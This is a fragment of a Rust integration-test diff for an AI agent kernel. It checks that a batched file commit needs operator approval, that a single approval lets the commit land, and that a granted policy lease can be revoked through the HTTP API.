+                json!({
+                    "path": "Cargo.toml",
+                    "content": "[package]\nname = \"demo\"\nversion = \"0.2.0\"\n"
+                }),
+            )
+            .await
+            .unwrap();
+        kernel
+            .call_tool(
+                &agent,
+                "fs_write",
+                json!({
+                    "path": "package.json",
+                    "content": "{\"name\":\"demo\",\"version\":\"0.2.0\"}\n"
+                }),
+            )
+            .await
+            .unwrap();
+
+        let ask = kernel
+            .call_tool(
+                &agent,
+                "workspace_commit",
+                json!({ "rationale": "Bump version across Rust and Node manifests" }),
+            )
+            .await
+            .unwrap();
+        assert_eq!(ask["status"], "approval_required");
+        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();
+
+        // 2. Web console fetches `GET /v1/approvals/diff?escalation_id=...` -> returns unified diff & rationale
+        let (head, diff_resp) = raw_http(
+            addr,
+            "GET",
+            &format!("/v1/approvals/diff?escalation_id={esc_id}"),
+            Some(&op),
+            None,
+        )
+        .await;
+        assert!(head.contains("200 OK"), "{head} {diff_resp}");
+        assert_eq!(
+            diff_resp["rationale"],
+            "Bump version across Rust and Node manifests"
+        );
+        let udiff = diff_resp["diff"]["unified_diff"].as_str().unwrap_or("");
+        assert!(udiff.contains("Cargo.toml") && udiff.contains("package.json"), "{diff_resp}");
+
+        // 3. Approving the single batched escalation once (`ttl_secs = 0`) authorizes BOTH sensitive files in 1 click!
+        let (head, dec_resp) = raw_http(
+            addr,
+            "POST",
+            "/v1/approvals/decide",
+            Some(&op),
+            Some(json!({ "escalation_id": esc_id, "decision": "approve", "ttl_secs": 0 })),
+        )
+        .await;
+        assert!(head.contains("200 OK"), "{head} {dec_resp}");
+
+        let commit_ok = kernel
+            .call_tool(&agent, "workspace_commit", json!({}))
+            .await
+            .unwrap();
+        assert_eq!(
+            commit_ok["status"], "committed_to_host",
+            "Single approval of batched sensitive commit must land all sensitive files without whack-a-mole"
+        );
+
+        // 4. Grant a 1-hour session lease and revoke it via `POST /v1/leases/revoke`
+        let granted = kernel
+            .call_tool(
+                &agent,
+                "policy_grant_lease",
+                json!({
+                    "action_pattern": "workspace_commit",
+                    "resource_pattern": "*",
+                    "ttl_secs": 3600
+                }),
+            )
+            .await
+            .unwrap();
+        let lease_id = granted["lease_id"].as_str().unwrap().to_string();
+        assert!(!kernel.policy.list_leases("acme", None).await.unwrap().is_empty());
+
+        let (head, rev_resp) = raw_http(
+            addr,
+            "POST",
+            "/v1/leases/revoke",
+            Some(&op),
+            Some(json!({ "lease_id": lease_id })),
+        )
+        .await;
+        assert!(head.contains("200 OK"), "{head} {rev_resp}");
+        assert_eq!(rev_resp["status"], "revoked");
+        assert!(
+            kernel
+                .policy
+                .list_leases("acme", None)
+                .await
+                .unwrap()
+                .iter()
+                .all(|l| l.lease_id != lease_id),
+            "Revoked lease must be removed from active leases"
         );
     }
 }
